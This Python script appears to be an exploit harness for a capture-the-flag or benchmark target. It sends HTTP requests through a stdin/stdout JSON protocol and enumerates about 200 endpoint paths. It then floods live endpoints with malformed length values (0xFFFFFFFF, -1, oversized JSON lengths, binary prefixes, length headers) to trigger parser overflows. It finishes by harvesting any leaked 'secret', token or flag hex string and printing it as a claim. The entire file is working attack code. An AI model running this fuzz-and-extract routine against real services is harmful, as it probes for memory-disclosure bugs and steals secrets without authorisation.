import json,sys,base64,re

def req(method,path,body=None,body_hex=None,headers=None):
    m={"http":{"method":method,"path":path}}
    if body is not None: m["http"]["body"]=body
    if body_hex is not None: m["http"]["body_hex"]=body_hex
    if headers: m["http"]["headers"]=headers
    sys.stdout.write(json.dumps(m)+"\n"); sys.stdout.flush()
    line=sys.stdin.readline()
    if not line: return None
    try: return json.loads(line)
    except Exception: return None

ENT=[]
def probe(method,path,body=None,body_hex=None,headers=None,tag=""):
    r=req(method,path,body,body_hex,headers)
    if not r:
        ENT.append({"tag":tag,"st":"NORESP","ct":None,"text":"","hex":""})
        return None
    b=r.get("body_b64") or ""
    try: raw=base64.b64decode(b)
    except Exception: raw=b.encode('latin-1','replace')
    e={"tag":tag,"st":str(r.get("status")),"ct":r.get("content_type"),
       "text":raw.decode('latin-1')[:3000],"hex":raw[:2000].hex()}
    ENT.append(e)
    return e

def live(e):
    return e is not None and e["st"] not in ("404","405","NORESP","")

PATHS=["/","/parse","/parse/","/parser","/records","/record","/records/parse","/record/parse","/parse/record","/api/parse","/api/record","/api/records","/v1/parse","/api/v1/parse","/api/v1/records","/api/v1/record","/parse_record","/parse-record","/parseRecord","/ingest","/upload","/decode","/read","/process","/handle","/rpc","/query","/data","/submit","/recv","/receive","/packet","/message","/msg","/obj","/object","/blob","/binary","/raw","/stream","/batch","/bulk","/create","/insert","/store","/write","/save","/import","/load","/fetch","/get","/extract","/scan","/convert","/transform","/validate","/new","/add","/post","/echo","/test","/flag","/secret","/admin","/debug","/source","/metrics","/info","/version","/docs","/doc","/spec","/schema","/openapi.json","/swagger.json","/healthz","/ready","/live","/health","/health/parse","/ping","/status","/index.html","/robots.txt","/favicon.ico","/api","/api/","/help","/readme","/README","/README.md","/usage","/format","/static","/public","/assets","/app","/main","/run","/exec","/do","/op","/action","/endpoint","/service","/handler","/dispatch","/route","/routes","/ws","/socket","/connect","/session","/job","/jobs","/task","/tasks","/worker","/queue","/push","/pull","/sync","/feed","/notify","/event","/events","/log","/logs","/line","/lines","/row","/rows","/field","/fields","/item","/items","/entry","/entries","/table","/tables","/cell","/cells","/frame","/frames","/chunk","/chunks","/segment","/buffer","/buf","/payload","/body","/documents","/documents/parse","/files","/file","/upload/parse","/form","/multipart","/text","/json","/xml","/csv","/avro","/protobuf","/proto","/msgpack","/bson","/fixed","/fixlen","/recordset","/recs","/rec","/tuple","/struct","/header","/headers","/meta","/metadata","/index","/catalog","/defs","/structs","/types","/security","/vuln","/vulnerable","/overflow","/bug","/exploit","/pwn","/test/parse","/debug/parse","/api/parse/record","/v1/record/parse","/api/records/parse","/records/create","/records/new","/record/new","/records/add","/parse/upload","/parse/data","/data/parse","/upload/records","/ingest/records","/decode/records","/records/decode","/records/read","/record/read","/read/record","/rec/parse","/recs/parse","/msg/parse","/message/parse","/packet/parse","/frame/parse","/chunk/parse","/binary/parse","/raw/parse","/blob/parse","/obj/parse","/object/parse","/record/parse/","/RECORD","/PARSE","/Parse","/Record","/parse2","/records2","/parse?"]

seen=set()
UNIQ=[p for p in PATHS if not (p in seen or seen.add(p))]
for p in UNIQ:
    probe("GET",p,tag="G "+p)
for p in UNIQ:
    probe("POST",p,body="",tag="P "+p)
for p in ["/","/health","/parse","/records"]:
    probe("OPTIONS",p,tag="O "+p)
    probe("PUT",p,body="",tag="U "+p)

POSTS=[]
for e in ENT:
    if live(e) and e["tag"].startswith("P "):
        p=e["tag"][2:]
        if p not in POSTS: POSTS.append(p)
GETS=[]
for e in ENT:
    if live(e) and e["tag"].startswith("G "):
        p=e["tag"][2:]
        if p not in GETS: GETS.append(p)
print("LIVEPOST",POSTS,file=sys.stderr)
print("LIVEGET",GETS,file=sys.stderr)

def pfx(n,size,little):
    return n.to_bytes(size,'little' if little else 'big')
BINS=[]
VALS=[0xFFFFFFFF,0x7FFFFFFF,0x80000000,0xFFFFFFF0,0xFFFFFFFE,0x00FFFFFF,0x0FFFFFFF,0x0000FFFF,0x00FF,0xFF,0x7F,0x01,0x100,0x10000,0x1000000,0x40000000,0xFFFF,0x0FFFFFFF]
for n in VALS:
    for size in (1,2,4,8):
        if n < (1<<(8*size)):
            for l in (False,True):
                BINS.append(pfx(n,size,l)+b"AAAA")
                BINS.append(pfx(n,size,l)+b"\x00\x00\x00\x01")
BINS.append(b"AAAA"+pfx(0xFFFFFFFF,4,False))
BINS.append(b"AAAA"+pfx(0xFFFFFFFF,4,True))
BINS.append(b"LEN"+pfx(0xFFFFFFFF,4,False))
BINS.append(b"\x01\x00\x00\x00"+pfx(0xFFFFFFFF,4,False))
BINS.append(b"\x00\x00\x00\x01"+pfx(0xFFFFFFFF,4,False))
BINS.append(b"\x00\x00\x00\x01"+pfx(0x7FFFFFFF,4,False))
BINS.append(b"\x00\x00\x00\x01"+pfx(0xFFFFFFFF,8,False))
BINS.append(b"\xff\xff\xff\xff")
BINS.append(b"\x80\x00\x00\x00\x00\x00\x00\x00AAAA")
BINS.append(b"\x7f\xff\xff\xffAAAA")
BINS.append(b"\xff\xff\xff\x7fAAAA")

TXTS=["len=-1","length=-1","LEN=-1","-1\nAAAA","AAAA\n-1","AAAA\n4294967295","4294967295:AAAA","4294967295 AAAA","AAAA 4294967295","AAAA\xff\xff\xff\xff","AAAA\n\xff\xff\xff\xff","\xff\xff\xff\xff\nAAAA","LEN=4294967295","length:4294967295","count=4294967295","n=-1","size=-1"]
JS=['{"length":-1}','{"length":4294967295}','{"length":2147483647}','{"length":-2147483648}','{"length":18446744073709551615}','{"length":9999999999999}','{"len":-1}','{"len":4294967295}','{"size":-1}','{"count":-1}','{"n":-1}','{"num":-1}','{"type":1,"length":-1}','{"records":[{"len":-1}]}','{"length":0,"data":""}','{"length":65536,"data":""}']
HDRS=[{"Content-Type":"application/json"},{"Content-Type":"application/octet-stream"},{"Content-Type":"text/plain"},{"Content-Type":"application/msgpack"},{"X-Record-Length":"4294967295"},{"X-Length":"4294967295"},{"X-Count":"4294967295"},{"X-N":"-1"}]

TARGETS=POSTS if POSTS else [p for p in ["parse","records/parse","record","/","records","upload","ingest","decode","read","api/parse"] if "/"+p not in GETS]
if not TARGETS: TARGETS=["/parse","/records/parse","/record","/","/records"]

for p in TARGETS:
    if not p.startswith("/"): p="/"+p
    for j in JS:
        probe("POST",p,body=j,headers={"Content-Type":"application/json"},tag="J "+p+" "+j)
    for rb in BINS:
        probe("POST",p,body_hex=rb.hex(),tag="B "+p+" "+rb.hex()[:32])
    for t in TXTS:
        probe("POST",p,body=t,tag="T "+p+" "+repr(t)[:32])
    for h in HDRS:
        probe("POST",p,body_hex=BINS[0].hex(),headers=h,tag="H "+p+" "+list(h.items())[0][0])
    probe("POST",p,body="A"*256,tag="S "+p+" big")
    probe("POST",p,body="AAAA\n"*5000,tag="R "+p+" lines")
    probe("POST",p,body_hex=(pfx(0xFFFFFFFF,4,False)+b"A"*64+pfx(4,4,False)+b"BBBB").hex(),tag="M "+p+" multi")

for p in GETS:
    probe("GET",p+"?len=4294967295",tag="GQ "+p)
    probe("GET",p+"?length=-1",tag="GQ2 "+p)

try:
    with open("/tmp/final.json","w") as f: json.dump(ENT,f)
except Exception: pass

uniq={}
for e in ENT:
    uniq.setdefault((e["st"],e["ct"],e["text"][:120]),0)
    uniq[(e["st"],e["ct"],e["text"][:120])]+=1
print("TOTAL",len(ENT),"GROUPS",len(uniq),file=sys.stderr)
for k,v in list(uniq.items())[:30]:
    print("GRP st=%s ct=%s n=%s %r"%(k[0],k[1],v,k[2][:110]),file=sys.stderr)

def norm(h):
    h=h.lower()
    if h.startswith("0x"): h=h[2:]
    h=re.sub(r'[^0-9a-f]','',h)
    if len(h)%2: h=h[:-1]
    return h

pick=""
prio=[e for e in ENT if re.search(r'(?i)secret',e["text"])]
prio+= [e for e in ENT if e["st"] in ("500","502","503","206","400","422") and live(e)]
pats=[r'(?i)secret[^0-9a-f]{0,20}([0-9a-fA-F]{8,200})',r'(?i)(?:token|flag|key)[^0-9a-f]{0,20}([0-9a-fA-F]{8,200})',r'[0-9a-fA-F]{16,200}']
for e in prio:
    for pat in pats:
        m=re.search(pat,e["text"])
        if m:
            v=norm(m.group(1))
            if len(v)>=8:
                pick=v; break
    if pick: break
if not pick:
    for e in ENT:
        if re.search(r'(?i)secret',e["text"]):
            for pat in pats:
                m=re.search(pat,e["text"])
                if m:
                    pick=norm(m.group(1)); break
        if pick: break
print("PICK",pick,file=sys.stderr)
print('CLAIM:'+json.dumps({"secret_hex":pick}))